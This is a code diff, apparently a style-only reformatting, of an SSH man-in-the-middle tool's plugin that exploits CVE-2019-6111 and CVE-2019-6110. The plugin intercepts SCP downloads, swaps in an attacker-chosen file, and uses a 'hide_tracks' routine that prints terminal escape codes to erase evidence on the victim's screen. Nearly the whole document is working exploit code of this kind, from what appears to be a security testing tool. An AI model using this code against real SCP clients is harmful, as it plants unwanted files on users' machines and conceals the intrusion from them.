@@ -17,7 +17,7 @@ from sshmitm.forwarders.scp import SCPForwarder
 
 
 class SCPInjectFile(SCPForwarder):
-    '''Injecting an additional file during SCP transmission (CVE-2019-6111, CVE-2019-6110)
+    """Injecting an additional file during SCP transmission (CVE-2019-6111, CVE-2019-6110)
 
     This feature is based on a OpenSSH Client Vulnerability 'SSHtranger Things'
     that has been patched with version > OpenSSH 8.0p1
@@ -28,29 +28,30 @@ class SCPInjectFile(SCPForwarder):
     Date:      2019-01-17
     CVE:       CVE-2019-6111, CVE-2019-6110
     Advisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt
-    '''
+    """
 
     @classmethod
     def parser_arguments(cls) -> None:
         plugin_group = cls.parser().add_argument_group(
-            cls.__name__,
-            "Example exploit for CVE-2019-6111, CVE-2019-6110"
+            cls.__name__, "Example exploit for CVE-2019-6111, CVE-2019-6110"
         )
         plugin_group.add_argument(
-            '--scp-inject-file',
-            dest='scp_inject_file',
+            "--scp-inject-file",
+            dest="scp_inject_file",
             required=True,
-            help='file that is used for injection'
+            help="file that is used for injection",
         )
 
     def __new__(cls, *args, **kwargs):  # type: ignore
         del kwargs  # unused arguments
-        if args[0].scp_command.find(b'-f') != -1:
+        if args[0].scp_command.find(b"-f") != -1:
             return super(SCPInjectFile, cls).__new__(cls)
-        logging.debug("SCPClient is not downloading a file, reverting to normal SCPForwarder")
+        logging.debug(
+            "SCPClient is not downloading a file, reverting to normal SCPForwarder"
+        )
         return SCPForwarder(args[0])
 
-    def __init__(self, session: 'sshmitm.session.Session') -> None:
+    def __init__(self, session: "sshmitm.session.Session") -> None:
         super().__init__(session)
         self.args.scp_inject_file = os.path.expanduser(self.args.scp_inject_file)
 
@@ -58,33 +59,39 @@ class SCPInjectFile(SCPForwarder):
         self.file_to_inject = None
 
     def process_data(self, traffic: bytes) -> bytes:
-        if traffic == b'\x00':
+        if traffic == b"\x00":
             self.exploit()
         return traffic
 
     def exploit(self) -> None:
-        """This method starts to exploit CVE-2019-6111 and CVE-2019-6110.
-        """
+        """This method starts to exploit CVE-2019-6111 and CVE-2019-6110."""
+
         def wait_ok() -> bool:
             if self.session.scp_channel is None:
                 return False
-            return self.session.scp_channel.recv(1024) == b'\x00'
+            return self.session.scp_channel.recv(1024) == b"\x00"
 
         def send_ok() -> None:
             if self.session.scp_channel is None:
                 return
-            self.session.scp_channel.sendall(b'\x00')
+            self.session.scp_channel.sendall(b"\x00")
 
         # This is CVE-2019-6111: whatever file the client requested, we send
         # them 'exploit.txt' instead.
         if self.session.scp_channel is None:
             return
-        logging.info('Injecting file %s to channel %d', self.args.scp_inject_file, self.session.scp_channel.get_id())
+        logging.info(
+            "Injecting file %s to channel %d",
+            self.args.scp_inject_file,
+            self.session.scp_channel.get_id(),
+        )
         command = "{}{} {} {}\n".format(  # pylint: disable=consider-using-f-string
             self.file_command,
-            "{0:o}".format(self.inject_file_stat.st_mode)[2:],  # pylint: disable=consider-using-f-string
+            "{0:o}".format(self.inject_file_stat.st_mode)[  # pylint: disable=consider-using-f-string
+                2:
+            ],
             self.inject_file_stat.st_size,
-            self.args.scp_inject_file.split('/')[-1]
+            self.args.scp_inject_file.split("/")[-1],
         )
         logging.debug("Sending command %s", command.strip())
         self.session.scp_channel.sendall(command.encode())
@@ -92,12 +99,19 @@ class SCPInjectFile(SCPForwarder):
             logging.info("Client is not vulnerable to CVE-2019-6111")
             self.hide_tracks()
             return
-        with open(self.args.scp_inject_file, 'rb') as file_to_inject:
-            self.sendall(self.session.scp_channel, file_to_inject.read(), self.session.scp_channel.send)
+        with open(self.args.scp_inject_file, "rb") as file_to_inject:
+            self.sendall(
+                self.session.scp_channel,
+                file_to_inject.read(),
+                self.session.scp_channel.send,
+            )
         send_ok()
         wait_ok()
         self.hide_tracks()
-        logging.warning("Successful exploit CVE-2019-6111 over channel %d", self.session.scp_channel.get_id())
+        logging.warning(
+            "Successful exploit CVE-2019-6111 over channel %d",
+            self.session.scp_channel.get_id(),
+        )
 
     def hide_tracks(self) -> None:
         """
@@ -109,4 +123,4 @@ class SCPInjectFile(SCPForwarder):
         """
         if self.session.scp_channel is None:
             return
-        self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode('ascii'))
+        self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode("ascii"))
